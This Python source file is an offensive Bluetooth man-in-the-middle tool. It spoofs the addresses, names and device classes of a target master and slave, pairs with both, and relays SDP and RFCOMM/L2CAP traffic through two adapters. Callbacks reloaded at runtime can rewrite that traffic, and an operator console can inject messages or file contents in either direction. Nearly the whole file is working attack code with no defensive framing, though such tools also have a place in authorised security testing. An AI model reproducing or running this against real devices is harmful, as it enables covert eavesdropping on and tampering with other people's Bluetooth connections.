import bluetooth, sys, time, select, os
from threading import Thread
from bluetooth import *
from btmitm_utils import *
from btmitm_adaptor import *
from bluez_simple_agent import Paired


if sys.version < '3':
    input = raw_input

# open an rfcomm port and return socket
def server(adapt_addr,service):
    server_sock=None
    print service

    if service['protocol'].lower() == 'l2cap':
        server_sock=BluetoothSocket( L2CAP )
    else:
        server_sock=BluetoothSocket( RFCOMM )

    print 'Binding to ', adapt_addr, service['protocol'] ,service['port']
    #server_sock.bind((adapt_addr,service['port']))
    server_sock.bind(('',service['port']))
    print 'binded'
    server_sock.listen(1)
    print 'listening'

    port = server_sock.getsockname()[1]

    return server_sock
 
# increments the last octet of a mac addr and returns it as string
def incLastOctet(addr):
    return addr[:15] + hex((int(addr.split(':')[5], 16) + 1) & 0xff).replace('0x','').upper()

def MiTM_sdp(slave,):
    server=bluetooth.BluetoothSocket( bluetooth.L2CAP )
    server.bind(('',1))
    server.listen(10)
    sock=bluetooth.BluetoothSocket(bluetooth.L2CAP)
    sock.connect((slave, 1))
    print 'SDP interceptor started'
    client_sock,address = server.accept()
    print("SDP Inq from  ",address)
    fds = [client_sock,sock,server]
    while True:
        inputready, outputready, exceptready = select.select(fds,[],[])
        for s in inputready:
            if s == client_sock:
                try:
                    data = client_sock.recv(100000)
                    if not data: 
                        #print 'No data'
                        raise RuntimeError('client dc\'d')
                    #print 'client_sock sdp recv', data
                    try:
                        sock.send(data)
                    except Exception as e:
                        print 'client failed ',e
                except Exception as e:
                    fds = [sock,server]
                    client_sock.close()
                    #print '(SDP) recv client failed ',e

            if s == sock:
                print 'slave sdp recv'
                try:
                    data = sock.recv(100000)
                    try:
                        client_sock.send(data)
                    except Exception as e:
                        print 'inquirer disconnected', e
                        client_sock.close()
                        fds = [sock,server]
                except Exception as e:
                    while True:
                        #print 'could not recv from slave ',e
                        sock=bluetooth.BluetoothSocket(bluetooth.L2CAP)
                        try:
                            sock.connect((slave, 1))
                            fds = [client_sock] if len(fds) > 2 else []
                            fds += [sock,server]

                            break
                        except Exception as e: print 'slave connect failed ',e
            if s == server:
                client_sock,address = server.accept()
                fds = [sock,server,client_sock]
                print("SDP Inq from  ",address)



       
    

def MiTM_socket(slave_sock, service, master_adaptor):
    server_sock = server( adaptor_address(master_adaptor), service )
    print slave_sock
    master_sock, client_info = server_sock.accept()
    print master_sock,slave_sock
    print("Accepted connection from ", client_info)
    fds = [master_sock, slave_sock, sys.stdin]
    reshandler, reqhandler = refreshHandlers()
    lastreq = ''
    lastres = ''
    def relay(sender, recv, cb):
        data = sender.recv(1000)
        data = cb(data)
        recv.send(data)

    while True:
        inputready, outputready, exceptready = select.select(fds,[],[])
        for s in inputready:

            # master
            if s == master_sock:
                try:
                    relay(master_sock, slave_sock, reqhandler)
                except Exception as e:
                    print e, 'socket master reconnecting...'
                    master_sock, client_info = server_sock.accept()
                    print("Accepted connection from ", client_info)
                    fds = [master_sock, slave_sock, sys.stdin]
                    break

            # slave
            if s == slave_sock:
                try:
                    relay(slave_sock, master_sock, reshandler)
                except Exception as e:
                    print e, 'socket slave reconnecting...'
                    slave_sock = connect_to_svc(service, reconnect=True)
                    fds = [master_sock, slave_sock, sys.stdin]
                    break

            # user commands
            try:
                if s == sys.stdin:
                    cmd = raw_input()

                    if cmd: print '<< '+ cmd +' >>'
                    cmd = cmd.lower()
                    if cmd[:1] == 'r' or cmd[:7] == 'refresh':
                        print '<< Refreshed >>'
                        reshandler, reqhandler = refreshHandlers()
                    elif cmd[:1] == 'a':
                        print '<< Resending last request >>'
                        slave_sock.send( reshandler( lastreq ))
                    elif cmd[:2] == 'sm':
                        print 'Enter msg to send to slave:'
                        a = raw_input()
                        print '>>', a
                        slave_sock.send(a)

                    elif cmd[:2] == 'mm':
                        print 'Enter msg to send to master:'
                        a = raw_input()
                        print '<<', a
                        master_sock.send(a)
                    elif cmd[:2] == 'sf':
                        print 'sending file contents to slave...'
                        contents = open(cmd.split(' ')[1],'r').read()
                        print '>>', contents
                        slave_sock.send(contents)


                    elif cmd[:2] == 'mf':
                        print 'sending file contents to master...'
                        contents = open(cmd.split(' ')[1],'r').read()
                        print '<<', contents
                        master_sock.send(contents)

            except Exception as e:
                print e

    server_sock.close() 
    master_sock.close() 
    slave_sock.close() 


def mitm(target_slave, target_master, **kwargs):

    if os.getuid() != 0:
        print "Must run as root. (sudo)"
        import sys
        sys.exit(1)
    
    instrument_bluetoothd()

    skip = kwargs.get('skip', False)
    adaptors = list_adaptors()
    if len(adaptors) < 2:
        raise RuntimeError('Needs to be atleast two bluetooth adaptors')
    slave_adaptor = adaptors[0]
    master_adaptor = adaptors[1]
    
    #thread = Thread(target = MiTM_socket, args = (sock, service, master_adaptor,))
    if not skip:
        enable_adaptor(slave_adaptor)
        enable_adaptor(master_adaptor)
        reset_adaptor(slave_adaptor)
        reset_adaptor(master_adaptor)


        # set addresses before setup
        adaptor_address(slave_adaptor, incLastOctet(target_master))
        adaptor_address(master_adaptor, incLastOctet(target_slave))

        reset_adaptor(slave_adaptor)
        reset_adaptor(master_adaptor)

        print 'Slave adaptor: ', slave_adaptor
        print 'Master adaptor: ', master_adaptor

        print 'Looking up info on slave ('+target_slave+')'
        slave_info = lookup_info(target_slave)
        print 'Looking up info on master ('+target_master+')'
        master_info = lookup_info(target_master)

        enable_adaptor(slave_adaptor, True)

        #advertise_adaptor(slave_adaptor, False)

        # clone the slave adaptor as the master device
        mn = args.slave_name if args.slave_name else slave_info['name']+'_EVIL'
        print 'Spoofing master name as ', mn
        adaptor_name(master_adaptor, mn)
        if args.slave_active:
            print 'Pairing (spoofed slave & master)...'
            enable_adaptor(master_adaptor, True)
            adaptor_name(master_adaptor, mn)
            adaptor_class(master_adaptor, slave_info['class'])
            enable_adaptor_ssp(master_adaptor,True)
            advertise_adaptor(master_adaptor, True)
            while True:
                try:
                    pair_adaptor(master_adaptor, target_master)
                    break
                except Exception as e:
                    print e
                    print 'Trying again ...'
                    time.sleep(1)
 
        enable_adaptor_ssp(slave_adaptor,True)
        print 'Pairing (spoofed master & slave)...'
        sln = args.master_name if args.master_name else master_info['name']+'_EVIL'
        print 'Spoofing slave name as ', sln
        adaptor_name(slave_adaptor, sln)
        while True:
            try:
                pair_adaptor(slave_adaptor, target_slave)
                break
            except Exception as e:
                print e
                print 'Trying again ..'
                time.sleep(1)
    
    enable_adaptor(master_adaptor, True)
    enable_adaptor_ssp(master_adaptor,True)
    advertise_adaptor(master_adaptor, True)

    # open connections
    try:

        socks = safe_connect(target_slave)
        threads = []
        sdpthread = Thread(target =MiTM_sdp, args = (target_slave,))
        sdpthread.daemon = True
        sdpthread.start()


        for (sock, service) in socks:

            print 'Beginning MiTM on ', service['name']

            thread = Thread(target = MiTM_socket, args = (sock, service, master_adaptor,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
         # clone the master adaptor as the slave device
        if not skip:
            print slave_info['class']
            adaptor_class(master_adaptor, slave_info['class'])
            adaptor_class(slave_adaptor, master_info['class'])

        import signal, sys
        def signal_handler(signal, frame):
            print('Stopping...')
            sys.exit(0)
        signal.signal(signal.SIGINT, signal_handler)
        signal.pause()

        for i in threads:
            i.join()
        sdpthread.join()

    except Exception as e:
        print 'Error: ',e

                        

def refreshHandlers():
    """
        reloads the manipulation code during runtime
    """
    try:
        import btmitm_replace
        reload(btmitm_replace)
    except Exception as e: 
        print e
    from btmitm_replace import btmitm_slave_cb, btmitm_master_cb
    return btmitm_slave_cb, btmitm_master_cb

def connect_to_svc(device, **kwargs):
    socktype = bluetooth.RFCOMM
    try:
        if device['protocol'] == None or device['protocol'].lower() == 'rfcomm':
            socktype = bluetooth.RFCOMM

        elif device['protocol'].lower() == 'l2cap':
            socktype = bluetooth.L2CAP
        else:
            print('Unsupported protocol '+device['protocol'])
    except Exception as e: 
        print e

    while True:
        try:
            sock=bluetooth.BluetoothSocket( socktype )
            sock.connect((device['host'] if device['host'] else target, device['port'] if device['port'] else 1))
            print 'Connected'
            return sock
        except BluetoothError as e:
            if '115' in e[0]:  # connection in progress
                return sock
            print 'Couldnt connect: ',e, e[0][0]
            if not kwargs.get('reconnect',False):
                raise RuntimeError("connect_to_svc")
            print 'Reconnecting...'


def safe_connect(target):
    """
        Connect to a target as a client.
    """

    # First, we must look for the advertising device
    # and figure out if it's using rfcomm or l2cap

    services = bluetooth.find_service(address=target)

    device = None
    name = None
    socks = []
    
    if len(services) <= 0:
        print 'Running inquiry scan'
        services = inquire(target)
        print services

    if len(services) > 0:
        print("Found %d services on %s" % (len(services), target))
        print('')
        for device in services:
            #print('Name: ' + name)
            print 'connecting to : '
            try:
                print_service(device)
                sock=connect_to_svc(device)
                if sock:
                    socks.append([sock,device])
            except Exception as e:
                print 'Not connected (',e,')'

    else:
        raise RuntimeError('Could not lookup '+target)

    
    return socks







